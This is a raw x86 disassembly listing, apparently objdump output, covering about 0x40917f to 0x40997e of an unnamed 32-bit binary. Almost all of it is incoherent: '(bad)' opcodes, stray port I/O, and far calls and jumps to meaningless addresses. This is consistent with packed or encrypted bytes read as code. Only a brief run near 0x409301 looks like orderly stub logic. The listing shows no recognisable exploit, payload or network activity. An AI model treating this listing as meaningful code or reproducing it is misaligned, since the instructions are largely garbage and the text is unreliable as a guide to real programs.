  40917f:	sbb    DWORD PTR es:[ecx],esi
  409182:	jo     0x40911f
  409184:	stos   BYTE PTR es:[edi],al
  409185:	es xchg ebx,eax
  409187:	imul   eax,eax,0x75
  40918a:	scas   eax,DWORD PTR es:[edi]
  40918b:	sbb    eax,0xb5e30725
  409190:	rol    BYTE PTR [eax],0x20
  409193:	es cld 
  409195:	out    dx,al
  409196:	mov    ds:0x4f012117,eax
  40919b:	mov    edi,0x44fafef9
  4091a0:	mov    ch,bh
  4091a2:	sbb    al,ah
  4091a4:	mov    BYTE PTR [edi+ecx*8+0x2052cb78],ch
  4091ab:	xor    DWORD PTR [esi+0x1c5df742],edx
  4091b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4091b2:	pop    ebx
  4091b3:	push   eax
  4091b4:	out    dx,al
  4091b5:	jbe    0x40914d
  4091b7:	shr    DWORD PTR ds:0xdd920836,0xab
  4091be:	enter  0x8da5,0xc1
  4091c2:	popf   
  4091c3:	cld    
  4091c4:	push   esi
  4091c5:	mov    esi,0x5c6c4d8b
  4091ca:	jne    0x40921e
  4091cc:	and    BYTE PTR [ecx+eiz*1-0x63621429],0x53
  4091d4:	jae    0x4091de
  4091d6:	ins    BYTE PTR es:[edi],dx
  4091d7:	xor    bl,BYTE PTR [eax]
  4091d9:	push   esi
  4091da:	jb     0x4091d9
  4091dc:	push   esp
  4091dd:	mov    edi,?
  4091df:	dec    ecx
  4091e0:	adc    eax,0x7ab0b25d
  4091e5:	jp     0x40925a
  4091e7:	rcr    BYTE PTR [edx+eax*8-0x2],1
  4091eb:	push   esp
  4091ec:	cli    
  4091ed:	sbb    eax,0x5cd2bf63
  4091f2:	div    BYTE PTR [edi+0x49]
  4091f5:	sub    DWORD PTR [ecx-0x3b322e56],0x52
  4091fc:	(bad)  
  4091fe:	stos   DWORD PTR es:[edi],eax
  4091ff:	adc    edi,esi
  409201:	std    
  409202:	pop    ecx
  409203:	push   cs
  409204:	or     edx,ebp
  409206:	dec    ecx
  409207:	mov    cl,0xcf
  409209:	mov    ebx,0x168d402b
  40920e:	mov    esi,0xabdf1bc4
  409213:	clc    
  409214:	push   esi
  409215:	dec    edx
  409216:	inc    ecx
  409217:	stc    
  409218:	dec    esp
  409219:	xchg   DWORD PTR [esi+0x8517a1],edx
  40921f:	dec    ecx
  409220:	jbe    0x409289
  409222:	rcr    DWORD PTR [eax+0x5e],1
  409225:	mov    gs:0xf8e9b5e,al
  40922b:	pop    ecx
  40922c:	mov    al,0x52
  40922e:	cmp    edi,edi
  409230:	call   0x2059:0xdda3f8e7
  409237:	adc    ah,BYTE PTR ds:0xa6fa3785
  40923d:	fwait
  40923e:	lea    esi,[edi-0x387cf0a8]
  409244:	int    0xb7
  409246:	cmp    ch,BYTE PTR [edi]
  409248:	dec    esi
  409249:	pushf  
  40924a:	sbb    BYTE PTR [edi-0x2d7f67da],bh
  409250:	js     0x409251
  409252:	pop    ds
  409253:	mov    esi,0x3cc8609b
  409258:	(bad)  
  409259:	xor    DWORD PTR [edi],esp
  40925b:	sbb    ah,dh
  40925d:	imul   edx,edi,0x1f90cd59
  409263:	in     al,dx
  409264:	adc    edx,ebp
  409266:	jle    0x409279
  409268:	mov    bh,0x44
  40926a:	dec    edx
  40926b:	lods   eax,DWORD PTR ds:[esi]
  40926c:	sbb    eax,0x8b7a2e4f
  409271:	bound  ebp,QWORD PTR [ebp+0x529a7cc9]
  409277:	and    edi,DWORD PTR [ebx-0xf]
  40927a:	or     ch,BYTE PTR [edi+0x18]
  40927d:	xor    eax,0x548fe9f1
  409282:	stos   BYTE PTR es:[edi],al
  409283:	push   eax
  409284:	cli    
  409285:	jb     0x4092a9
  409287:	shl    DWORD PTR [edx],0x29
  40928a:	aad    0x9
  40928c:	lahf   
  40928d:	and    al,0xcc
  40928f:	ror    DWORD PTR [edi+0x5c13377c],1
  409295:	xor    al,BYTE PTR [eax-0x584676aa]
  40929b:	cmp    eax,ecx
  40929d:	pop    edx
  40929e:	cmp    eax,0x890b8bfc
  4092a3:	(bad)
  4092a6:	pop    edx
  4092a7:	out    dx,eax
  4092a8:	sahf   
  4092a9:	pop    ebx
  4092aa:	ds iret 
  4092ac:	add    esi,eax
  4092ae:	jg     0x409239
  4092b0:	cmp    ebx,DWORD PTR [esi+0x76]
  4092b3:	sbb    esp,esp
  4092b5:	xchg   esi,eax
  4092b6:	push   DWORD PTR [esi-0x79dfccb4]
  4092bc:	mov    al,0xea
  4092be:	lods   eax,DWORD PTR ds:[esi]
  4092bf:	xor    BYTE PTR [eax],ah
  4092c1:	retf   
  4092c2:	ret    0x4602
  4092c5:	sub    eax,0x457c4969
  4092ca:	push   esi
  4092cb:	call   0x3181:0xe28ccceb
  4092d2:	push   edi
  4092d3:	jmp    0x4092a4
  4092d5:	push   ss
  4092d6:	(bad)  
  4092d8:	sub    esp,DWORD PTR [ebp-0x1760745b]
  4092de:	pop    esp
  4092df:	pop    esi
  4092e0:	pop    es
  4092e1:	(bad)  
  4092e2:	mov    ds:0x74b62fce,al
  4092e7:	cld    
  4092e8:	mov    ch,0xaa
  4092ea:	(bad)  
  4092eb:	cmp    DWORD PTR [ebx+0x691b7aec],edi
  4092f1:	loope  0x409298
  4092f3:	and    al,0xde
  4092f5:	jmp    0x4092b3
  4092f7:	adc    DWORD PTR [edx],ecx
  4092f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4092fa:	or     eax,0xf441b289
  4092ff:	jle    0x409302
  409301:	push   DWORD PTR [eax]
  409303:	lea    eax,ds:0x41b260
  409309:	push   DWORD PTR [eax]
  40930b:	lea    eax,ds:0x41b344
  409311:	push   DWORD PTR [eax]
  409313:	xchg   ebx,edx
  409315:	inc    ebx
  409316:	inc    ebx
  409317:	sub    ebx,0x3
  40931a:	push   ebx
  40931b:	pop    eax
  40931c:	jmp    0x409669
  409321:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409322:	jnp    0x409329
  409324:	or     DWORD PTR [ecx+0x52b3b211],esp
  40932a:	lahf   
  40932b:	jo     0x4092ae
  40932d:	arpl   WORD PTR [edx],cx
  40932f:	adc    al,0x9a
  409331:	daa    
  409332:	loop   0x4093a4
  409334:	jo     0x409356
  409336:	jge    0x4093a8
  409338:	jo     0x409357
  40933a:	fdiv   DWORD PTR [eax]
  40933c:	cwde   
  40933d:	scas   al,BYTE PTR es:[edi]
  40933e:	out    0x57,eax
  409340:	loopne 0x409364
  409342:	nop
  409343:	mov    dl,0xfd
  409345:	xchg   DWORD PTR [edi-0x16],ebx
  409348:	ror    esi,cl
  40934a:	dec    BYTE PTR [edx]
  40934c:	jns    0x409316
  40934e:	cmp    DWORD PTR [eax+0x7f],edx
  409351:	ja     0x409332
  409353:	stos   BYTE PTR es:[edi],al
  409354:	hlt    
  409355:	sub    al,0x86
  409357:	rcr    ebp,cl
  409359:	ret    
  40935a:	sub    dh,BYTE PTR [esi]
  40935c:	mov    al,ds:0x75f7bd0b
  409361:	adc    al,0x96
  409363:	aas    
  409364:	nop
  409365:	out    dx,eax
  409366:	add    ch,al
  409368:	cmc    
  409369:	mov    ebp,0xb2efa646
  40936e:	popf   
  40936f:	mov    esp,0x6d534728
  409374:	shl    esi,cl
  409376:	loopne 0x4093d1
  409378:	in     eax,dx
  409379:	scas   al,BYTE PTR es:[edi]
  40937a:	dec    esp
  40937b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40937c:	out    0x56,eax
  40937e:	sbb    eax,0x20e6d440
  409383:	push   esp
  409384:	lds    edx,FWORD PTR [eax]
  409386:	inc    ebp
  409387:	dec    esp
  409388:	pop    ebx
  409389:	pop    edx
  40938a:	mov    edi,fs
  40938c:	daa    
  40938d:	inc    ecx
  40938e:	into   
  40938f:	iret   
  409390:	xchg   edi,eax
  409391:	add    bl,ah
  409393:	push   esp
  409394:	xor    BYTE PTR [edi-0x7686ccbb],al
  40939a:	cmp    ecx,DWORD PTR [ebp+edx*1+0x3e]
  40939e:	call   0x91fd7daf
  4093a3:	sbb    eax,0x4f1236da
  4093a8:	in     eax,dx
  4093a9:	inc    edx
  4093aa:	sbb    al,0xcc
  4093ac:	das    
  4093ad:	cmp    BYTE PTR [edx],al
  4093af:	gs daa 
  4093b1:	and    BYTE PTR [ecx+eiz*8+0x39c19dd],0x38
  4093b9:	jecxz  0x409408
  4093bb:	mov    ah,0x36
  4093bd:	mov    bl,0xc
  4093bf:	sti    
  4093c0:	out    dx,eax
  4093c1:	mov    ds:0x69019043,al
  4093c6:	fsub   DWORD PTR [ecx+ebp*2]
  4093c9:	mov    ah,0x22
  4093cb:	loop   0x409416
  4093cd:	adc    ecx,eax
  4093cf:	popa   
  4093d0:	fsubp  st(0),st
  4093d2:	xor    eax,0x9f377a81
  4093d7:	push   ecx
  4093d8:	inc    edx
  4093d9:	mov    ebx,DWORD PTR [edx+ebp*1]
  4093dc:	dec    esi
  4093dd:	jp     0x409440
  4093df:	mov    ds:0x6e45a11b,al
  4093e4:	sub    BYTE PTR [esi+0x4d],cl
  4093e7:	xchg   esp,eax
  4093e8:	pushf  
  4093e9:	jmp    DWORD PTR [ebx-0x2f]
  4093ec:	dec    ebx
  4093ed:	mov    edx,0xed2ca2ea
  4093f2:	push   ebx
  4093f3:	pop    ebp
  4093f4:	nop
  4093f5:	cmp    al,0xd
  4093f7:	sbb    al,0x6
  4093f9:	iret   
  4093fa:	push   0x6e2cca2e
  4093ff:	jmp    0x409420
  409401:	xchg   BYTE PTR [eax-0xe],bl
  409404:	jnp    0x40945a
  409406:	pusha  
  409407:	repz jge 0x409439
  40940a:	cmp    ebp,ecx
  40940c:	outs   dx,BYTE PTR ds:[esi]
  40940d:	rcl    DWORD PTR [ecx+eax*2-0x4c],cl
  409411:	mov    ss,WORD PTR [esi+0x3dfb15b6]
  409417:	mov    BYTE PTR [edx-0x6d62a4ef],ch
  40941d:	pop    ebx
  40941e:	leave  
  40941f:	les    edx,FWORD PTR [edx+0xdc7a8d9]
  409425:	sub    eax,0x860741d2
  40942a:	sti    
  40942b:	ins    DWORD PTR es:[edi],dx
  40942c:	push   esi
  40942d:	in     al,dx
  40942e:	mov    cl,0xc1
  409430:	popf   
  409431:	arpl   WORD PTR [esi-0x59],bx
  409434:	call   0x1d8be3c0
  409439:	jl     0x409432
  40943b:	push   ecx
  40943c:	dec    edi
  40943d:	mov    eax,ds:0x1bb48b9
  409442:	inc    ecx
  409443:	mov    eax,ds:0x57a88684
  409448:	test   edi,esp
  40944a:	jmp    0x4eb0:0x3911b9f8
  409451:	jmp    0x87d2:0x4e5a311
  409458:	call   0xd0f5:0x24a49e3f
  40945f:	fwait
  409460:	rcr    BYTE PTR [edx+0x2667f551],cl
  409466:	add    BYTE PTR [ecx-0x7e],0xc
  40946a:	xchg   ebp,esi
  40946c:	aaa    
  40946d:	shl    ah,0x70
  409470:	in     al,0x22
  409472:	fild   QWORD PTR [edx-0x67]
  409475:	xchg   esp,eax
  409477:	pop    ds
  409478:	mov    eax,0x70393cce
  40947d:	mov    DWORD PTR [ebp+0x7ed0e41b],ecx
  409483:	loopne 0x409449
  409485:	daa    
  409486:	mov    esi,edx
  409488:	dec    edi
  409489:	lds    esp,FWORD PTR [ebp-0x60cfc1b4]
  40948f:	adc    cl,BYTE PTR [eax+0x6f86697f]
  409495:	xchg   esp,eax
  409496:	jecxz  0x4094e7
  409498:	dec    ebx
  409499:	dec    edx
  40949a:	loopne 0x4094d6
  40949c:	fldenv [edi+0x3d3450db]
  4094a2:	std    
  4094a3:	clc    
  4094a4:	cmp    DWORD PTR [ecx+ecx*8+0x5f6d198],ecx
  4094ab:	jge    0x409443
  4094ad:	sub    dh,dh
  4094af:	clc    
  4094b0:	or     DWORD PTR [eax*2-0x4047613e],edi
  4094b7:	mov    ds:0x35033e60,al
  4094bc:	fld    DWORD PTR ds:0xf9c89af8
  4094c2:	bound  ebp,QWORD PTR [ebp-0x32]
  4094c5:	add    BYTE PTR [esi-0x58da830f],dh
  4094cb:	xor    al,0x44
  4094cd:	sbb    eax,0x8a272b14
  4094d2:	jae    0x4094d6
  4094d4:	dec    ebx
  4094d5:	fsubr  QWORD PTR [ebx]
  4094d7:	pop    es
  4094d8:	inc    esi
  4094d9:	ss mov al,0x8e
  4094dc:	push   ecx
  4094dd:	mov    ah,0x99
  4094df:	xchg   edx,eax
  4094e0:	push   ecx
  4094e1:	rcl    DWORD PTR [ecx],1
  4094e3:	jno    0x4094e8
  4094e5:	aam    0x6f
  4094e7:	(bad)  
  4094e8:	das    
  4094e9:	lea    eax,[ebx+ecx*4+0x35]
  4094ed:	add    al,0x43
  4094ef:	jno    0x409516
  4094f1:	retf   0x551
  4094f4:	pop    ecx
  4094f5:	inc    ecx
  4094f6:	pop    ebx
  4094f7:	mov    eax,ds:0x5656aa22
  4094fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4094fd:	xchg   ebp,eax
  4094fe:	mov    ebp,0x4fe017db
  409503:	xor    BYTE PTR [ebx],ch
  409505:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409506:	pop    ss
  409507:	lds    esp,FWORD PTR [esi-0x62cf66b1]
  40950d:	push   0xffffffd5
  40950f:	mov    bh,0x7c
  409511:	add    bh,BYTE PTR [eax+0xc827522]
  409517:	adc    DWORD PTR [eax],ebp
  409519:	add    bh,BYTE PTR [ecx-0x66382599]
  40951f:	clc    
  409520:	fsub   QWORD PTR [edi]
  409522:	data16 mov dl,0x90
  409525:	rcr    DWORD PTR [edi+0x40],0xb8
  409529:	pop    ds
  40952a:	jmp    0x414cd67a
  40952f:	mov    ?,WORD PTR [esi+ecx*1+0x0]
  409533:	xor    eax,0x3af4e8c4
  409538:	stc    
  409539:	dec    ecx
  40953a:	cmp    al,0xcb
  40953c:	cli    
  40953d:	add    al,0xf0
  40953f:	clc    
  409540:	dec    ebx
  409541:	ja     0x409527
  409543:	sbb    cl,BYTE PTR [ecx+0x63e058c2]
  409549:	in     eax,0x94
  40954b:	jl     0x4094fd
  40954d:	push   edx
  40954e:	int    0xf2
  409550:	pop    esp
  409551:	mov    edx,DWORD PTR [ebx]
  409553:	add    BYTE PTR [ebx],bl
  409555:	rcl    BYTE PTR [eax-0x3ab5c7c9],0x4c
  40955c:	int3   
  40955d:	add    edi,DWORD PTR [esi+0x4a8ba094]
  409563:	jno    0x409513
  409565:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409566:	rcl    BYTE PTR [ebp-0x71],cl
  409569:	sub    DWORD PTR [ecx+0x29],0xcd451224
  409570:	fiadd  DWORD PTR [eax-0x547ae9e7]
  409576:	mov    dh,0x3a
  409578:	cli    
  409579:	clc    
  40957a:	stos   DWORD PTR es:[edi],eax
  40957b:	mov    ds:0xa7e66b56,al
  409580:	jg     0x4095d7
  409582:	daa    
  409583:	test   BYTE PTR [esi+0x22fa367],0xc8
  40958a:	call   0x14af1f57
  40958f:	gs xchg ebp,eax
  409591:	test   DWORD PTR [eax+edi*1+0x1bea664c],ebx
  409598:	jo     0x40951b
  40959a:	iret   
  40959b:	sbb    BYTE PTR [ecx+ecx*1],ah
  40959e:	xchg   ebx,eax
  40959f:	mov    ?,WORD PTR [edi-0x1b25ebb3]
  4095a5:	adc    BYTE PTR [esi],0x4f
  4095a8:	test   DWORD PTR [eax-0x2e],edi
  4095ab:	repz test bh,0xaa
  4095af:	ins    DWORD PTR es:[edi],dx
  4095b0:	out    dx,al
  4095b1:	cmc    
  4095b2:	leave  
  4095b3:	jnp    0x40962d
  4095b5:	fwait
  4095b6:	add    al,BYTE PTR [esi-0x5db1547f]
  4095bc:	add    ch,al
  4095be:	cmp    DWORD PTR [eax],edi
  4095c0:	test   eax,0x7e1dbe72
  4095c5:	inc    edx
  4095c6:	imul   ebx,DWORD PTR [ecx+0x381f94fe],0xd
  4095cd:	sub    ah,BYTE PTR [esi+0x68]
  4095d0:	xchg   esp,eax
  4095d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4095d2:	jne    0x4095ed
  4095d4:	mov    DWORD PTR [esi+ebp*2+0x57],esi
  4095d8:	pusha  
  4095d9:	xchg   edi,eax
  4095da:	in     eax,0xa3
  4095dc:	ins    BYTE PTR es:[edi],dx
  4095dd:	add    eax,0x5f95e273
  4095e2:	pushf  
  4095e3:	or     al,0xdd
  4095e5:	js     0x409610
  4095e7:	loop   0x409653
  4095e9:	or     eax,0x962ee955
  4095ee:	pop    edi
  4095ef:	test   al,0x3
  4095f1:	arpl   WORD PTR [edi],bx
  4095f3:	sub    BYTE PTR [ecx+0x29a9795f],0x4f
  4095fa:	push   es
  4095fb:	enter  0x3c2d,0x6b
  4095ff:	inc    esi
  409600:	adc    ah,BYTE PTR [edi]
  409602:	dec    ebx
  409603:	push   ds
  409604:	adc    BYTE PTR [esi+0x3a5edb17],dh
  40960a:	or     DWORD PTR [eax-0x595ed335],eax
  409610:	inc    ebp
  409611:	pop    ecx
  409612:	inc    edx
  409613:	loope  0x409634
  409615:	mov    ebx,esi
  409617:	test   ebx,esi
  409619:	fwait
  40961a:	pinsrw mm0,WORD PTR [ecx],0x3f
  40961e:	mov    eax,0x7c4bba42
  409623:	pop    edi
  409624:	lea    ebp,[edx]
  409626:	mov    al,0x74
  409628:	(bad)  
  409629:	jg     0x4095f0
  40962b:	push   cs
  40962c:	jns    0x4095ca
  40962e:	or     bl,BYTE PTR [ebp-0x4]
  409631:	mov    BYTE PTR [edi+eax*2+0x4d],bl
  409635:	xchg   edx,eax
  409636:	repnz add WORD PTR cs:[esi+0x66],bp
  40963c:	xor    BYTE PTR [ebx],dh
  40963e:	pop    edx
  40963f:	jecxz  0x4096aa
  409641:	adc    BYTE PTR [edx+0x4f023da],ah
  409647:	jl     0x40967c
  409649:	jne    0x40968b
  40964b:	sub    eax,0xdfd4c829
  409650:	push   esp
  409651:	mov    al,0x3c
  409653:	js     0x409651
  409655:	fs stos BYTE PTR es:[edi],al
  409657:	cmp    eax,0x1242446a
  40965c:	xor    eax,0x129040e1
  409661:	cli    
  409662:	jmp    0x4096b2
  409664:	clc    
  409665:	sbb    edx,DWORD PTR [edi+0x50ff1f96]
  40966b:	add    DWORD PTR [ebx+0xd8be045],ecx
  409671:	and    al,0xb2
  409673:	inc    ecx
  409674:	add    cl,ch
  409676:	dec    eax
  409677:	add    eax,DWORD PTR [eax]
  409679:	add    bh,ch
  40967b:	mov    ebx,0xd169d149
  409680:	ja     0x4096e3
  409682:	add    BYTE PTR [edi+0x44],bh
  409685:	xchg   DWORD PTR [esi-0x28ce85a1],esi
  40968b:	out    dx,eax
  40968c:	jo     0x4096fe
  40968e:	and    BYTE PTR [ebp+0x70],bh
  409691:	jo     0x4096d3
  409693:	mov    ah,0xa1
  409695:	sub    al,0xbd
  409697:	aas    
  409698:	fcomp  DWORD PTR [edi-0x20]
  40969b:	les    esi,FWORD PTR [ecx-0x44bb9007]
  4096a1:	inc    eax
  4096a2:	mov    ds:0xcb5b0f6b,eax
  4096a7:	mov    ecx,DWORD PTR [ecx+edx*2+0x69739faa]
  4096ae:	inc    esi
  4096af:	mov    esp,0xf64e62d9
  4096b4:	lea    edi,[ebx+eiz*1+0x361010b2]
  4096bb:	dec    edx
  4096bc:	mov    edi,0x4dfa197d
  4096c1:	cmp    ecx,DWORD PTR [esi+ebp*8]
  4096c4:	pushf  
  4096c5:	jbe    0x4096bc
  4096c7:	push   ebp
  4096c8:	xor    ebx,DWORD PTR [esi]
  4096ca:	mov    bl,0xa9
  4096cc:	fist   WORD PTR fs:[eax-0x1a]
  4096d0:	sbb    eax,0x9c5725a4
  4096d5:	dec    ebx
  4096d6:	(bad)  
  4096d7:	mov    eax,0xa4eb690b
  4096dc:	jp     0x4096b5
  4096de:	imul   esi,ebp,0x4e
  4096e1:	out    0x9d,al
  4096e3:	jno    0x4096e5
  4096e5:	sbb    esp,eax
  4096e7:	into   
  4096e8:	push   ds
  4096e9:	push   eax
  4096ea:	mov    ah,0xf2
  4096ec:	addr16 push eax
  4096ee:	cmp    cl,BYTE PTR [eax-0x7]
  4096f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4096f2:	lahf   
  4096f3:	and    eax,0x32bf6b79
  4096f8:	ret    
  4096f9:	mov    ebp,0x3e6c8b5d
  4096fe:	cli    
  4096ff:	push   0x56648df0
  409704:	sbb    BYTE PTR [esp+esi*1],0x6f
  409708:	mov    esp,0x9fb8f479
  40970d:	pop    edi
  40970e:	in     al,0x5e
  409710:	jnp    0x4096f6
  409712:	rcr    BYTE PTR [ecx-0x63],1
  409715:	aas    
  409716:	(bad)  
  409717:	into   
  409718:	nop
  409719:	call   0x592d221d
  40971e:	jmp    0x56e:0x51835eb3
  409725:	ss sub eax,0xb93fc5f1
  40972b:	ret    0xa2a5
  40972e:	outs   dx,DWORD PTR ds:[esi]
  40972f:	dec    edi
  409730:	dec    edx
  409731:	test   BYTE PTR [edi-0x6d],bh
  409734:	fxch   st(6)
  409736:	stc    
  409737:	mov    eax,0x4fcf0a83
  40973c:	arpl   cx,di
  40973e:	loopne 0x409775
  409740:	in     al,dx
  409741:	(bad)  
  409742:	mov    dh,0xfb
  409744:	(bad)  
  409746:	fwait
  409747:	lods   eax,DWORD PTR ds:[esi]
  409748:	(bad)  [edx+0x117e565a]
  40974e:	sbb    eax,0xd8ae88
  409753:	lds    eax,FWORD PTR [esi-0x4665ae66]
  409759:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40975a:	cmovnp eax,edx
  40975d:	xor    eax,0xa4f9f38a
  409762:	and    eax,0x9492b5ba
  409767:	int    0x7b
  409769:	in     al,dx
  40976a:	xchg   ebp,ebp
  40976c:	push   ds
  40976d:	sub    eax,0xb247c724
  409772:	mov    esi,0x72222405
  409777:	jnp    0x409763
  409779:	leave  
  40977a:	shr    DWORD PTR [edx+0x2b],0xbf
  40977e:	in     al,dx
  40977f:	xor    esi,ebx
  409781:	js     0x409781
  409783:	push   ebp
  409784:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409785:	push   eax
  409786:	inc    edi
  409787:	mov    dh,0xdc
  409789:	(bad)  
  40978a:	stc    
  40978b:	rcl    BYTE PTR [ecx+0x27a8f5a7],0x58
  409792:	jl     0x40980c
  409794:	or     eax,0xebd5d1cd
  409799:	retf   0xa964
  40979c:	push   eax
  40979d:	or     esp,DWORD PTR [edi]
  40979f:	cmp    eax,0xa6ceece1
  4097a4:	pop    es
  4097a5:	sbb    ecx,DWORD PTR [ebp+ebx*4+0x36]
  4097a9:	mov    al,ds:0x4495974b
  4097ae:	xchg   esi,eax
  4097af:	ret    0x6cc4
  4097b2:	push   ds
  4097b3:	add    eax,0xdba2d73c
  4097b8:	mov    bh,0x38
  4097ba:	lods   eax,DWORD PTR ds:[esi]
  4097bb:	xor    DWORD PTR [edx],edx
  4097bd:	add    eax,0xd76195e3
  4097c2:	cdq    
  4097c3:	or     al,0x88
  4097c5:	test   al,0x1c
  4097c7:	or     al,0x4d
  4097c9:	mov    dl,0x78
  4097cb:	jle    0x409834
  4097cd:	adc    al,0xd0
  4097cf:	jo     0x40975d
  4097d1:	pop    ebx
  4097d2:	cmp    DWORD PTR [esi+0x5cfe1305],esi
  4097d8:	xor    ecx,DWORD PTR [edx+0x70]
  4097db:	inc    eax
  4097dc:	scas   al,BYTE PTR es:[edi]
  4097dd:	mov    bh,BYTE PTR [eax-0x38]
  4097e0:	ins    DWORD PTR es:[edi],dx
  4097e1:	pop    DWORD PTR [ebp+0x1e]
  4097e4:	fadd   QWORD PTR fs:[esi-0x29]
  4097e8:	lods   al,BYTE PTR ds:[esi]
  4097e9:	dec    eax
  4097ea:	fwait
  4097eb:	push   ecx
  4097ec:	call   0xfd37:0x69c34f85
  4097f3:	push   ds
  4097f4:	outs   dx,BYTE PTR ds:[esi]
  4097f5:	ficom  WORD PTR [ebx+0xea352f0]
  4097fb:	push   es
  4097fc:	sbb    edx,DWORD PTR [esi+eiz*8]
  4097ff:	jo     0x409811
  409801:	sbb    BYTE PTR ds:0x26dad9e4,0xd2
  409808:	push   ecx
  409809:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40980a:	aad    0xbf
  40980c:	dec    eax
  40980d:	mov    DWORD PTR [edi+0x6d157580],ecx
  409813:	mov    dl,0x96
  409815:	add    eax,0x43e1d405
  40981a:	xchg   ebx,eax
  40981b:	dec    esp
  40981c:	rcr    DWORD PTR [edx+0x6d],0x20
  409820:	(bad)  
  409821:	ficomp DWORD PTR [ebx-0x207ff5e1]
  409827:	fidiv  WORD PTR [esi-0x17]
  40982a:	cmp    esp,eax
  40982c:	cld    
  40982d:	xchg   BYTE PTR [edi-0xb88ec57],dl
  409833:	push   0x2c
  409835:	mov    dh,BYTE PTR [edi-0x60]
  409838:	inc    ecx
  409839:	imul   edx,DWORD PTR [ebp+0x2b7b2e19],0x76
  409840:	stos   BYTE PTR es:[edi],al
  409841:	into   
  409842:	inc    edx
  409843:	jae    0x409834
  409845:	push   0xecdafcf
  40984a:	repnz ins BYTE PTR es:[edi],dx
  40984c:	jb     0x4098c6
  40984e:	pop    ebp
  40984f:	push   ecx
  409850:	pop    ecx
  409851:	js     0x40985a
  409853:	cdq    
  409854:	dec    esp
  409855:	aas    
  409856:	mov    cl,ah
  409858:	jp     0x409836
  40985a:	jne    0x4098d5
  40985c:	mov    cl,0xe8
  40985e:	push   edx
  40985f:	stos   DWORD PTR es:[edi],eax
  409860:	sar    BYTE PTR [esi],0x50
  409863:	push   esp
  409864:	cmc    
  409865:	adc    eax,ecx
  409867:	jno    0x4098a4
  409869:	xor    al,0xff
  40986b:	pop    ebp
  40986c:	dec    edi
  40986d:	mov    cl,0x2f
  40986f:	jbe    0x409888
  409871:	jl     0x4098ca
  409873:	rcl    BYTE PTR [esi-0x5e231d69],0xea
  40987a:	(bad)  
  40987b:	pop    edx
  40987c:	mov    cl,0x7d
  40987e:	sub    BYTE PTR [ebp-0x109f71cd],al
  409884:	pushf  
  409885:	jg     0x4098f6
  409887:	dec    edx
  409888:	enter  0x25e0,0x41
  40988c:	inc    edx
  40988d:	pusha  
  40988e:	push   eax
  40988f:	mov    al,0x69
  409891:	mov    dl,0xb
  409893:	pusha  
  409894:	int3   
  409895:	jb     0x40985c
  409897:	mov    al,ds:0xe63d79a3
  40989c:	sbb    eax,0xa4c91bb8
  4098a1:	mov    ch,0x88
  4098a3:	retf   
  4098a4:	in     al,dx
  4098a5:	mov    ebp,0xb5049ff0
  4098aa:	cmp    DWORD PTR [eax+esi*2+0x7e695e3],ecx
  4098b1:	dec    ebp
  4098b2:	sub    ebx,DWORD PTR [eax+0x55]
  4098b5:	jge    0x409850
  4098b7:	call   0xb9c5:0xab10a31a
  4098be:	ficomp DWORD PTR [edi-0x7b]
  4098c1:	mov    BYTE PTR [ecx+edi*1+0x67d99b8e],bl
  4098c8:	cmp    bh,ah
  4098ca:	push   esp
  4098cb:	mov    ah,0x92
  4098cd:	jl     0x409871
  4098cf:	fld    TBYTE PTR gs:[ecx]
  4098d2:	not    DWORD PTR [eax]
  4098d4:	mov    ch,0xfb
  4098d6:	cmp    bl,bl
  4098d8:	stos   DWORD PTR es:[edi],eax
  4098d9:	in     eax,dx
  4098da:	shr    BYTE PTR [esi],cl
  4098dc:	(bad)  
  4098dd:	xor    BYTE PTR [eax],ch
  4098df:	iret   
  4098e0:	pop    ds
  4098e1:	push   ebx
  4098e2:	push   esp
  4098e3:	fs popf 
  4098e5:	lods   al,BYTE PTR ds:[esi]
  4098e6:	push   esp
  4098e7:	jbe    0x409879
  4098e9:	xchg   esp,eax
  4098ea:	mov    dh,0x2f
  4098ec:	daa    
  4098ed:	xor    BYTE PTR [edx+0x3b2a7b09],ah
  4098f3:	push   ss
  4098f4:	cmp    eax,0xa2d112d5
  4098f9:	dec    ecx
  4098fa:	cmp    eax,0xc5ae43b7
  4098ff:	mov    ds:0x742e9491,al
  409904:	sbb    al,ch
  409906:	push   ebx
  409907:	push   esi
  409908:	mov    edi,0x87b5fde
  40990d:	xchg   ebp,eax
  40990e:	bound  ecx,QWORD PTR [ecx+0x15dfbb74]
  409914:	cdq    
  409915:	lods   eax,DWORD PTR ds:[esi]
  409916:	or     ebp,DWORD PTR [ecx-0x657a5058]
  40991c:	pop    ss
  40991d:	jns    0x40990f
  40991f:	mov    bh,0xdd
  409921:	mov    ecx,0xf688d458
  409926:	push   ss
  409927:	sub    al,0x9c
  409929:	enter  0x69dc,0x35
  40992d:	dec    ecx
  40992e:	xchg   edx,eax
  40992f:	mov    WORD PTR [eax+0x21],?
  409932:	fsub   DWORD PTR [ecx]
  409934:	xchg   ebp,eax
  409935:	call   FWORD PTR [edx-0x54]
  409938:	pop    ds
  409939:	sub    DWORD PTR [ecx+0x4e],0xffffff94
  40993d:	(bad)  
  40993e:	push   0x86f0ce16
  409943:	mov    eax,ds:0xd5805065
  409948:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409949:	mov    cl,0x1e
  40994b:	xchg   esi,eax
  40994c:	lahf   
  40994d:	cdq    
  40994e:	mov    esi,0x36c17a13
  409953:	ins    DWORD PTR es:[edi],dx
  409954:	xchg   edi,eax
  409955:	(bad)
  409958:	jmp    0x409951
  40995a:	das    
  40995b:	pop    esp
  40995c:	push   eax
  40995d:	jg     0x4099d2
  40995f:	or     al,ah
  409961:	adc    eax,0xe53ea643
  409966:	ja     0x409968
  409968:	sub    al,0x3f
  40996a:	ret    
  40996b:	mov    ebx,0x37a69be
  409970:	mov    DWORD PTR [edi-0x1a677819],ebp
  409976:	and    DWORD PTR [ecx+ebp*1-0x3632c2fc],ebx
  40997d:	retf   
  40997e:	inc    eax
